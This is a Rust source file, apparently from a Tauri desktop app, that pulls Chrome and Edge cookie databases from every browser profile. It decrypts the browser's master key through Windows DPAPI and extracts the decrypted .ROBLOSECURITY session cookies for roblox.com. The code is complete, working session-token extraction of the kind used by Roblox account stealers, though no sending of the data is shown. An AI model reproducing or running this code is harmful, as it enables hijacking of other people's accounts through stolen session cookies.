#![allow(dead_code)]
use std::path::{Path, PathBuf};
use std::fs;
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use base64::Engine;

#[cfg(target_os = "windows")]
#[link(name = "crypt32")]
extern "system" {
    fn CryptUnprotectData(
        pDataIn: *const DATA_BLOB,
        ppszDataDescr: *mut *mut u16,
        pOptionalEntropy: *const DATA_BLOB,
        pvReserved: *mut std::ffi::c_void,
        pPromptStruct: *mut std::ffi::c_void,
        dwFlags: u32,
        pDataOut: *mut DATA_BLOB,
    ) -> i32;
}

#[cfg(target_os = "windows")]
#[repr(C)]
#[allow(non_snake_case)]
struct DATA_BLOB {
    cbData: u32,
    pbData: *mut u8,
}

#[cfg(target_os = "windows")]
fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>, String> {
    let input = DATA_BLOB {
        cbData: data.len() as u32,
        pbData: data.as_ptr() as *mut u8,
    };
    let mut output = DATA_BLOB {
        cbData: 0,
        pbData: std::ptr::null_mut(),
    };
    unsafe {
        let success = CryptUnprotectData(
            &input,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            &mut output,
        );
        if success == 0 {
            return Err("CryptUnprotectData failed".into());
        }
        let result = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
        windows_sys::Win32::Foundation::LocalFree(output.pbData as _);
        Ok(result)
    }
}

#[cfg(not(target_os = "windows"))]
fn dpapi_decrypt(_data: &[u8]) -> Result<Vec<u8>, String> {
    Err("DPAPI is only supported on Windows".into())
}

#[cfg(target_os = "windows")]
pub fn dpapi_decrypt_bytes(data: &[u8]) -> Result<Vec<u8>, String> {
    dpapi_decrypt(data)
}

#[cfg(not(target_os = "windows"))]
pub fn dpapi_decrypt_bytes(_data: &[u8]) -> Result<Vec<u8>, String> {
    Err("DPAPI is only supported on Windows".into())
}


fn get_aes_key(local_state_path: &Path) -> Result<Vec<u8>, String> {
    let content = fs::read_to_string(local_state_path)
        .map_err(|e| format!("Failed to read Local State: {}", e))?;
    let json: serde_json::Value = serde_json::from_str(&content)
        .map_err(|e| format!("Failed to parse Local State JSON: {}", e))?;
    
    let encrypted_key_b64 = json["os_crypt"]["encrypted_key"]
        .as_str()
        .ok_or_else(|| "os_crypt.encrypted_key not found in Local State".to_string())?;
    
    let encrypted_key_bytes = base64::engine::general_purpose::STANDARD.decode(encrypted_key_b64)
        .map_err(|e| format!("Failed to decode base64 key: {}", e))?;
    
    if encrypted_key_bytes.len() < 5 {
        return Err("Encrypted key too short".into());
    }
    
    if &encrypted_key_bytes[..5] != b"DPAPI" {
        return Err("Encrypted key doesn't start with DPAPI".into());
    }
    
    let encrypted_data = &encrypted_key_bytes[5..];
    dpapi_decrypt(encrypted_data)
}

fn decrypt_aes_256_gcm(key: &[u8], encrypted_value: &[u8]) -> Result<String, String> {
    if encrypted_value.len() < 3 + 12 + 16 {
        return Err("Encrypted cookie value too short".into());
    }
    let nonce_bytes = &encrypted_value[3..15];
    let ciphertext = &encrypted_value[15..];
    
    let cipher = Aes256Gcm::new_from_slice(key).map_err(|e| e.to_string())?;
    let nonce = Nonce::from_slice(nonce_bytes);
    let plaintext = cipher.decrypt(nonce, ciphertext).map_err(|e| e.to_string())?;
    
    String::from_utf8(plaintext).map_err(|e| e.to_string())
}

fn decrypt_cookie_value(encrypted: &[u8], key: &[u8]) -> Result<String, String> {
    if encrypted.len() >= 3 && (&encrypted[..3] == b"v10" || &encrypted[..3] == b"v11") {
        decrypt_aes_256_gcm(key, encrypted)
    } else {
        let plaintext = dpapi_decrypt(encrypted)?;
        String::from_utf8(plaintext).map_err(|e| e.to_string())
    }
}

fn get_cookie_paths(profile_base: &Path) -> Vec<PathBuf> {
    let mut paths = Vec::new();
    if let Ok(entries) = fs::read_dir(profile_base) {
        for entry in entries.flatten() {
            if let Ok(file_type) = entry.file_type() {
                if file_type.is_dir() {
                    let dir_path = entry.path();
                    
                    let folder_name = dir_path.file_name().unwrap_or_default().to_string_lossy();
                    if folder_name.contains("Snapshot") || folder_name.contains("Crash") || folder_name.contains("System") {
                        continue;
                    }

                    let net_cookies = dir_path.join("Network").join("Cookies");
                    if net_cookies.is_file() {
                        paths.push(net_cookies);
                    }
                    let cookies = dir_path.join("Cookies");
                    if cookies.is_file() {
                        paths.push(cookies);
                    }
                }
            }
        }
    }
    paths
}

fn read_cookies_from_db(db_path: &Path, aes_key: &[u8]) -> Result<Vec<String>, String> {
    let temp_dir = std::env::temp_dir();
    let temp_path = temp_dir.join(format!("reiya_cookies_{}.tmp", rand::random::<u32>()));
    
    fs::copy(db_path, &temp_path).map_err(|e| format!("Failed to copy cookies DB: {}", e))?;
    
    let res = read_cookies_from_db_file(&temp_path, aes_key);
    
    let _ = fs::remove_file(&temp_path);
    res
}

fn read_cookies_from_db_file(db_path: &Path, aes_key: &[u8]) -> Result<Vec<String>, String> {
    let conn = rusqlite::Connection::open(db_path)
        .map_err(|e| format!("Failed to open database: {}", e))?;
    
    let mut stmt = conn.prepare(
        "SELECT encrypted_value FROM cookies WHERE host_key LIKE '%.roblox.com%' AND name = '.ROBLOSECURITY' AND encrypted_value IS NOT NULL"
    ).map_err(|e| format!("Failed to prepare query: {}", e))?;
    
    let rows = stmt.query_map([], |row| {
        let encrypted_val: Vec<u8> = row.get(0)?;
        Ok(encrypted_val)
    }).map_err(|e| format!("Failed to execute query: {}", e))?;
    
    let mut cookies = Vec::new();
    for row in rows.flatten() {
        if let Ok(cookie) = decrypt_cookie_value(&row, aes_key) {
            let trimmed = cookie.trim().to_string();
            if !trimmed.is_empty() && !cookies.contains(&trimmed) {
                cookies.push(trimmed);
            }
        }
    }
    
    Ok(cookies)
}

#[tauri::command]
pub async fn extract_browser_cookies(browser: String) -> Result<Vec<String>, String> {
    let local_app_data = std::env::var("LOCALAPPDATA")
        .map_err(|_| "LOCALAPPDATA environment variable not set".to_string())?;
    
    let profile_base = PathBuf::from(local_app_data).join(if browser == "Chrome" {
        PathBuf::from("Google").join("Chrome").join("User Data")
    } else if browser == "Edge" {
        PathBuf::from("Microsoft").join("Edge").join("User Data")
    } else {
        return Err(format!("Unsupported browser: {}", browser));
    });
    
    if !profile_base.exists() {
        return Err(format!("{} profile base directory not found at: {:?}", browser, profile_base));
    }
    
    let local_state_path = profile_base.join("Local State");
    if !local_state_path.exists() {
        return Err(format!("Local State file not found for {}", browser));
    }
    
    let aes_key = get_aes_key(&local_state_path)?;
    let cookie_files = get_cookie_paths(&profile_base);
    
    if cookie_files.is_empty() {
        return Err(format!("No cookie databases found for {}", browser));
    }
    
    let mut all_cookies = Vec::new();
    for cookie_file in cookie_files {
        match read_cookies_from_db(&cookie_file, &aes_key) {
            Ok(cookies) => {
                for c in cookies {
                    if !all_cookies.contains(&c) {
                        all_cookies.push(c);
                    }
                }
            }
            Err(e) => {
                eprintln!("Failed to read cookie db {:?}: {}", cookie_file, e);
            }
        }
    }
    
    Ok(all_cookies)
}
